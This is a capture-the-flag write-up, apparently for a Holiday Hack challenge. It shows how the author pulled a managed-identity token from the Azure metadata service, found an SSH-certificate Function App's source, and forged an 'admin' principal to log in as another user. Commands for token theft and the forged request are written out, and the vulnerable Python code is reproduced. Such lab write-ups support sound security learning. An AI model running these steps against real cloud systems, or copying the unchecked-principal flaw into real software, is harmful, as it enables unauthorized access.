<!-- report-keep -->

# certificate-sshenanigans <img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/>

<!-- report-ignore -->

[< Back Home](../README.md)

<!-- report-keep -->

## Objective

Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement? To solve this challenge, I need to retrieve Alabaster Snowball's TODO list. This is likely in the SSH server's filesystem somewhere.

<!-- report-ignore -->

## Conversations

Initial conversation:

- Hello there! Alabaster Snowball at your service.
- I could use your help with my fancy new Azure server at ssh-server-vm.santaworkshopgeeseislands.org.
- ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea!
- It even generated ready-to-deploy code for an [Azure Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl) so elves can request their own certificates. What a timesaver!
- I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy this configuration to all the Geese Islands servers.
- Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list.
- If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently.
- Oh, and if you need to peek at the Function App code, there's a handy [Azure REST API endpoint](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control) which will give you details about how the Function App is deployed.

After solving challenge:

- Oh my! I was so focused on the SSH configuration I completely missed the vulnerability in the Azure Function App.
- Why would ChatNPT generate code with such a glaring vulnerability? It's almost like it wanted my system to be unsafe. Could ChatNPT be evil?
- Thanks for the help, I'll go and update the application code immediately!
- While we're on the topic of certificates, did you know Active Directory (AD) uses them as well? Apparently the service used to manage them can have misconfigurations too.
- You might be wondering about that SatTrackr tool I've installed on the monitor account?
- Here's the thing, on my nightly stargazing adventures I started noticing the same satellite above Geese Islands.
- I wrote that satellite tracker tool to collect some additional data and sure enough, it's in a geostationary orbit above us.
- No idea what that means yet, but I'm keeping a close eye on that thing!

## Hints

- Check out Thomas Bouve's [talk and demo](https://youtu.be/4S0Rniyidt4) to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.
- The [get-source-control](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control) Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.
- Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the [Azure REST API](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token) instead.

<!-- report-keep -->

## Useful AI Prompts

- How do I generate an SSH keypair on windows using RSA and a UPN?
- How do I sign into a server using SSH and a signed cert on windows?
- How can I get a token for Azure API from an Azure Linux virtual machine?

## Approach
This one is interesting, and has multiple layers.  I began by reading between the lines to Alabaster Snowball's talk, which included something about checking out his new ssh server using monitor. To begin, I created a keypair (on windows) by issing the following command:

```console
ssh-keygen -t rsa -C "monitor@santaworkshopgeeseislands.org"
```

Next, I took the public key file that was generated (.pub) and copied the contents and pasted them into Alabaster Snowball's [Azure Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl)
If successful, the app will return a json object with both the ssh_cert and principal.  I copied ssh_cert value and pasted it into a file called signed-cert.pub the directory with my generated keypair from above. This is the file that will be used along with the private key to ssh into Alabaster's ssh server: ssh-server-vm.santaworkshopgeeseislands.org.
Once complete, to ssh into the server, opened a command prompt and navigated to the directory with the cert.

Be sure to use both the signed cert you received from the Azure Function App and your private key generated earlier:

```console
cd %USERPROFILE%\.ssh
ssh -i signed-cert.pub -i id_rsa monitor@ssh-server-vm.santaworkshopgeeseislands.org
```

Once into the server, I found myself at a sattelite tracking interface:

```console
┌──────────────── Satellite Tracking Interface ────────────────┐
│            ____     __ ______             __                 │
│           / __/__ _/ //_  __/______ _____/ /__ ____          │
│          _\ \/ _ `/ __// / / __/ _ `/ __/  '_// __/          │
│         /___/\_,_/\__//_/ /_/  \_,_/\__/_\_\/_/              │
│                                                              │
╞══════════════════════════════════════════════════════════════╡
│                                                              │
│  Position: 1.145128°, -145.261638°                           │
│  Velocity: 3.0701 km/s                                       │
│  Altitude: 35786.09 km above Earth's surface                 │
│  Signal Strength: 95.00%                                     │
│  Solar Panel Status: Deployed                                │
│  Battery Status: Unknown                                     │
│  Thermal Status: Unknown                                     │
│                                                              │
│          **** Geostationary orbit detected! ****             │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

By simply entering <kbd>Ctrl</kbd>-<kbd>c</kbd>, I was able to exit into the terminal.  Once here, I dug around a bit using the usual survey commands to see whether I could (or even needed to) escalate privs. One of the interesting files I came across was in the auth_principals folder of the ssh directory:

```console
monitor@ssh-server-vm:/$ cd /etc/ssh/
monitor@ssh-server-vm:/etc/ssh$ ls
auth_principals  ssh_config            ssh_host_ed25519_key-cert.pub  ssh_host_rsa_key-cert.pub  sshd_config.d
ca.pub           ssh_config.d          ssh_host_ed25519_key.pub       ssh_host_rsa_key.pub
moduli           ssh_host_ed25519_key  ssh_host_rsa_key               sshd_config
monitor@ssh-server-vm:/etc/ssh$ cd auth_principals/
monitor@ssh-server-vm:/etc/ssh/auth_principals$ ls
alabaster  monitor
monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat monitor
elf
monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster
admin
monitor@ssh-server-vm:/etc/ssh/auth_principals$
```

Looking at this, it is evident that even if I create a certificate for alabaster@ssh-server-vm.santaworkshopgeeseislands.org, I won't be able to authorize due to alabaster user only able to auth to ssh with the admin principal. The Azure Function App seems to automatically give the elf principal, although now that has me curious as to how it chooses to do so. I think it's time to see if I can find the source code for the Azure Function App.
To start, I suspect this server might be an Azure VM and if so, there are some things I can do to interact with the Azure API.  Starting with the Azure Instance Metadata service, because it is only accessible from an Azure VM and doesn't require a token to authenticate the way the standard API does. I begin with the following api using curl:

```console
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
```

What's returned is the following json object.

```json
{
  "compute": {
    "azEnvironment": "AzurePublicCloud",
    "customData": "",
    "evictionPolicy": "",
    "isHostCompatibilityLayerVm": "false",
    "licenseType": "",
    "location": "eastus",
    "name": "ssh-server-vm",
    "offer": "",
    "osProfile": {
      "adminUsername": "",
      "computerName": "",
      "disablePasswordAuthentication": ""
    },
    "osType": "Linux",
    "placementGroupId": "",
    "plan": {
      "name": "",
      "product": "",
      "publisher": ""
    },
    "platformFaultDomain": "0",
    "platformUpdateDomain": "0",
    "priority": "",
    "provider": "Microsoft.Compute",
    "publicKeys": [],
    "publisher": "",
    "resourceGroupName": "northpole-rg1",
    "resourceId": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines/ssh-server-vm",
    "securityProfile": {
      "secureBootEnabled": "false",
      "virtualTpmEnabled": "false"
    },
    "sku": "",
    "storageProfile": {
      "dataDisks": [],
      "imageReference": {
        "id": "",
        "offer": "",
        "publisher": "",
        "sku": "",
        "version": ""
      },
      "osDisk": {
        "caching": "ReadWrite",
        "createOption": "Attach",
        "diffDiskSettings": {
          "option": ""
        },
        "diskSizeGB": "30",
        "encryptionSettings": {
          "enabled": "false"
        },
        "image": {
          "uri": ""
        },
        "managedDisk": {
          "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/disks/ssh-server-vm_os_disk",
          "storageAccountType": "Standard_LRS"
        },
        "name": "ssh-server-vm_os_disk",
        "osType": "Linux",
        "vhd": {
          "uri": ""
        },
        "writeAcceleratorEnabled": "false"
      },
      "resourceDisk": {
        "size": "63488"
      }
    },
    "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
    "tags": "Project:HHC23",
    "tagsList": [
      {
        "name": "Project",
        "value": "HHC23"
      }
    ],
    "userData": "",
    "version": "",
    "vmId": "1f943876-80c5-4fc2-9a77-9011b0096c78",
    "vmScaleSetName": "",
    "vmSize": "Standard_B4ms",
    "zone": ""
  },
  "network": {
    "interface": [
      {
        "ipv4": {
          "ipAddress": [
            {
              "privateIpAddress": "10.0.0.50",
              "publicIpAddress": ""
            }
          ],
          "subnet": [
            {
              "address": "10.0.0.0",
              "prefix": "24"
            }
          ]
        },
        "ipv6": {
          "ipAddress": []
        },
        "macAddress": "6045BDFE2D67"
      }
    ]
  }
}
```

This now allows me to begin additional api calls now that I know the Subscription and Resource Group I have.  In order to hit standard APIs, I will need to generate a token.  To do so, I can actually get a token from the same endpoint in the Azure Instance Metadata Service because this machine is authenticated to the Azure service:

```console
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
```

This will return a json object with the access token:

```json
{"access_token":"eyJ0eXAi...","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85901","expires_on":"1702429034","ext_expires_in":"86399","not_before":"1702342334","resource":"https://management.azure.com/","token_type":"Bearer"}
```

Using that token, and the SubscriptionID, Resource Group and Function App Name, I now hit the source controls Azure API with the token in the header: https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01
I'm going to store the results in output.json in the monitor's home directory:

```console
cd /home/monitor
curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01" -H "Authorization:Bearer eyJ0eXAi..." -H "Content-Type:application/json" -o output.json -D - -s
cat output.json
```

In the output, I see some interesting things:
```json
{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web","name":"northpole-ssh-certs-fa","type":"Microsoft.Web/sites/sourcecontrols","location":"East US","tags":{"project":"northpole-ssh-certs","create-cert-func-url-path":"/api/create-cert?code=candy-cane-twirl"},"properties":{"repoUrl":"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa","branch":"main","isManualIntegration":false,"isGitHubAction":true,"deploymentRollbackEnabled":false,"isMercurial":false,"provisioningState":"Succeeded","gitHubActionConfiguration":{"codeConfiguration":null,"containerConfiguration":null,"isLinux":true,"generateWorkflowFile":true,"workflowSettings":{"appType":"functionapp","publishType":"code","os":"linux","variables":{"runtimeVersion":"3.11"},"runtimeStack":"python","workflowApiVersion":"2020-12-01","useCanaryFusionServer":false,"authType":"publishprofile"}}}}
```

Most notably: "repoUrl":"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa","branch":"main"
Navigating to https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa gives me full access to the sourcecode. I first review function_app.py

<!-- report-ignore -->

```python
"""Azure Function App to create SSH certificates."""
import base64
import json
import logging
import os
import uuid
from datetime import datetime, timedelta
from typing import Tuple

import azure.functions as func
from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient
from sshkey_tools.cert import CertificateFields, SSHCertificate
from sshkey_tools.keys import PrivateKey, PublicKey

DEFAULT_PRINCIPAL = os.environ['DEFAULT_PRINCIPAL']
KEY_VAULT_URL = os.environ['KEY_VAULT_URL']
CA_KEY_SECRET_NAME = os.environ['CA_KEY_SECRET_NAME']

app = func.FunctionApp(http_auth_level=func.AuthLevel.FUNCTION)
credential = DefaultAzureCredential()
secret_client = SecretClient(vault_url=KEY_VAULT_URL, credential=credential)


class ValidationError(BaseException):
    """Validation error."""


def parse_input(data) -> Tuple[PublicKey, str]:
    """Parse and validate input parameters."""
    ssh_pub_key = data.get("ssh_pub_key")

    if not ssh_pub_key:
        raise ValidationError("ssh_pub_key field is required.")

    if not isinstance(ssh_pub_key, str):
        raise ValidationError("ssh_pub_key is not a string.")

    ssh_pub_key = ssh_pub_key.strip()
    logging.info("SSH public key: %s", ssh_pub_key)

    if not (ssh_pub_key.lower().startswith("ssh-rsa") or ssh_pub_key.lower().startswith("ssh-ed25519")):
        raise ValidationError("ssh_pub_key is not an RSA or ED25519 SSH public key.")

    principal = data.get("principal", DEFAULT_PRINCIPAL)

    if not isinstance(principal, str):
        raise ValidationError("principal is not a string.")

    principal = principal.strip()
    logging.info("Principal: %s", principal)

    if not principal.isalpha():
        raise ValidationError("principal contains invalid characters.")

    try:
        return PublicKey.from_string(ssh_pub_key), principal
    except ValueError as err:
        raise ValidationError("ssh_pub_key is not a valid SSH public key.") from err


def get_form() -> str:
    """Get HTML form."""
    html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Request SSH Certificate</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #0093E9 0%, #80D0C7 100%);
            margin: 0;
            padding: 20px;
            background-attachment: fixed;
            background-size: cover;
            text-align: center;
        }
        .chatnpt_ad {
            background-color: #f9f2df;
            padding: 2px;
            border-radius: 10px;
            border: 4px solid #c0a080;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 680px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 30px;
            color: #222;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .chatnpt_ad .emoji { font-size: 4rem; }
        .chatnpt_ad .message { padding: 0 1rem; }
        .chatnpt_ad p {
            color: #222;
            font-size: 1.2rem;
            margin: 0px;
        }
        .chatnpt_ad .tagline {
            color: #ff5733;
        }
        @keyframes blinker {
            50% {
                opacity: 0;
            }
        }
        .chatnpt_ad strong {
            color: #0077cc;
            animation: blinker 1.5s linear infinite;
        }
        .container {
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .2);
            text-align: left;
        }
        .container h1 {
            color: #003366;
            text-align: center;
            margin-bottom: 20px;
        }
        #ssh_pub_key_textarea {
            width: 100%;
            box-sizing: border-box;
            resize: vertical;
            margin-bottom: 10px;
            font-family: "Courier New", monospace;
            font-size: 0.9em;
            color: #000;
        }
        .btn-primary {
            background-color: #FF7043;
            border-color: #FF7043;
        }
        .btn-primary:hover {
            background-color: #FF5722;
            border-color: #FF5722;
        }
        #wait_message {
            color: #003366;
            font-size: 1.3rem;
            margin-top: 20px;
        }
        #wait_message span {
            vertical-align: middle;
        }
        .loader {
            width: 24px;
            height: 24px;
            border: 4px solid #003366;
            border-bottom-color: transparent;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes rotation {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        #response_output {
            padding: 10px;
            font-family: "Courier New", monospace;
            font-size: 0.9em;
            overflow-x: auto;
            word-wrap: break-word;
            white-space: pre-wrap;
            max-width: 100%;
            margin: 0;
            margin-top: 20px;
            color: #000;
        }
        .success-output {
            border: 2px solid #28a745;
            background-color: #d4edda;

        }
        .error-output {
            border: 2px solid #dc3545;
            background-color: #f8d7da;
        }
    </style>
    <script>
        function getQueryParam(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        function submitForm(event) {
            event.preventDefault();

            const outputElement = document.getElementById('response_output');
            const spinnerElement = document.getElementById('wait_message');

            spinnerElement.style.display = 'block';
            outputElement.style.display = 'none';

            const sshPubKey = document.getElementById('ssh_pub_key_textarea').value;
            const codeParam = getQueryParam('code');
            let postUrl = "/api/create-cert";

            if (codeParam) {
                postUrl += `?code=${codeParam}`;
            }

            fetch(postUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ssh_pub_key: sshPubKey
                }),
            })
            .then(response => {
                const contentType = response.headers.get("content-type");

                if (contentType && contentType.includes("application/json")) {
                    return response.json().then(data => ({ status: response.status, body: data }));
                }

                throw new Error(`Unexpected content type: ${contentType}`);
            })
            .then(responseData => {
                spinnerElement.style.display = 'none';

                if (responseData.status >= 200 && responseData.status < 300) {
                    outputElement.classList.add('success-output');
                    outputElement.classList.remove('error-output');
                } else {
                    outputElement.classList.add('error-output');
                    outputElement.classList.remove('success-output');
                }

                outputElement.innerText = JSON.stringify(responseData.body, null, 4);
                outputElement.style.display = 'block';
            })
            .catch((error) => {
                console.error('Error:', error);

                spinnerElement.style.display = 'none';
                outputElement.innerText = error.toString();
                outputElement.classList.add('error-output');
                outputElement.classList.remove('success-output');
                outputElement.style.display = 'block';
            });
        }
    </script>
</head>
<body>
    <div class="chatnpt_ad">
        <span class="emoji">&#127965;</span>
        <div class="message">
            <p>Let your winter blues defrost in <strong>Geese Islands'</strong> warmth.</p>
            <p class="tagline">&#x1F366; Here, the only thing frozen is your dessert! &#x1F366;</p>
        </div>
        <span class="emoji">&#129727;</span>
    </div>
    <div class="container">
        <h1>Request SSH Certificate</h1>
        <form onsubmit="submitForm(event)">
            <div class="form-group">
                <textarea class="form-control" id="ssh_pub_key_textarea" rows="8" placeholder="Paste your SSH public key here"></textarea>
            </div>
            <button type="submit" class="btn btn-primary">Submit</button>
        </form>
        <div id="wait_message" style="display: none;">
            <span class="loader"></span><span>Please wait...</span>
        </div>
        <pre id="response_output" style="display:none;"></pre>
    </div>
</body>
</html>
    """

    return html_content


@app.route(route="create-cert", methods=['GET', 'POST'])
def create_cert(req: func.HttpRequest) -> func.HttpResponse:
    """Create SSH certificate."""
    logging.info('Python HTTP trigger function processed a request.')

    if req.method == "GET":
        return func.HttpResponse(
            get_form(),
            mimetype="text/html",
            status_code=200
        )

    try:
        ssh_pub_key, principal = parse_input(req.get_json())

        cert_fields = CertificateFields(
            serial=1,
            key_id=str(uuid.uuid4()),
            valid_after=datetime.utcnow() - timedelta(minutes=5),
            valid_before=datetime.utcnow() + timedelta(days=28),
            principals=[principal],
            critical_options=[],
            extensions=[
                "permit-pty"
            ]
        )

        ca_ssh_priv_key_b64 = secret_client.get_secret(CA_KEY_SECRET_NAME).value

        if ca_ssh_priv_key_b64 is not None:
            ca_ssh_priv_key_str = base64.b64decode(ca_ssh_priv_key_b64).decode('utf-8')
            ca_ssh_priv_key = PrivateKey.from_string(ca_ssh_priv_key_str)
        else:
            raise ValueError("Failed to retrieve Certificate Authority key.")

        ssh_cert = SSHCertificate.create(
            subject_pubkey=ssh_pub_key,
            ca_privkey=ca_ssh_priv_key,
            fields=cert_fields,
        )

        ssh_cert.sign()
        logging.info("SSH signed certificate: %s", ssh_cert.to_string())

        return func.HttpResponse(
            json.dumps({"ssh_cert": ssh_cert.to_string(), "principal": principal}),
            mimetype="application/json",
            status_code=200
        )
    except (ValueError, ValidationError) as err:
        return func.HttpResponse(
            json.dumps({"error": str(err)}),
            mimetype="application/json",
            status_code=400
        )
    except Exception as err:
        return func.HttpResponse(
            json.dumps({"error": f"Unexpected error: {str(err)}"}),
            mimetype="application/json",
            status_code=500
    )
```

<!-- report-keep -->

Most notably in that source code, this line is intriguing based on what I have found so far:

```python
principal = data.get("principal", DEFAULT_PRINCIPAL)
```

If I adjust my post message to the Request SSH Certificate Azure App, I should be able to get a signed certificate with admin as the principal. I will use powershell for that, but first I need to create a new keypair for the user alabaster@santaworkshopgeeseislands.org, and save those public and private keys to the same ssh directory as I did for monitor.

```console
ssh-keygen -t rsa -C "alabaster@santaworkshopgeeseislands.org"
```

Now that I have the keypair generated, I can pivot to powershell and use that public key to request a certificate through Invoke-WebRequest while also passing the Principal property in the Post body:

```powershell
$uri = "https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl"

$body = @{
    #copy the contents of your generated public key here
    'ssh_pub_key' = 'ssh-rsa AAAAB3Nc....nr0gVLiRm9Of028= alabaster@santaworkshopgeeseislands.org'
    'principal' = 'admin'
    }

$body = $body | ConvertTo-Json

$content = Invoke-WebRequest -Uri $uri -Method POST -Body $body
$content.Content
```

And we are there! The PowerShell comes back with something like:

```json
{"ssh_cert": "rsa-sha2-512-cert-v01@openssh.com AAAA...EzD/h2py3QA= ", "princip
al": "admin"}
```

I now have a certificate that I can save to my SSH folder that will allow me to SSH as Alabaster with the principal admin! I saved the above output of the ssh_cert value to my ssh folder as al_signed-cert.pub and my private key al_id_rsa generated earlier is in the same folder.
Back to a console on my Windows machine, I'm able to successfully SSH as alabaster:

```console
ssh -tt -i al_signed-cert.pub -i al_id_rsa alabaster@ssh-server-vm.santaworkshopgeeseislands.org
alabaster@ssh-server-vm:~$ ls
alabaster_todo.md  impacket
alabaster@ssh-server-vm:~$ cat alabaster_todo.md
# Geese Islands IT & Security Todo List

- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
```

All that's left, is to go back to the objective and answer the question based on the TODO list :)

## Resources

[Azure Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl)

[talk and demo](https://youtu.be/4S0Rniyidt4)

[get-source-control](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control)

[Azure REST API](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)
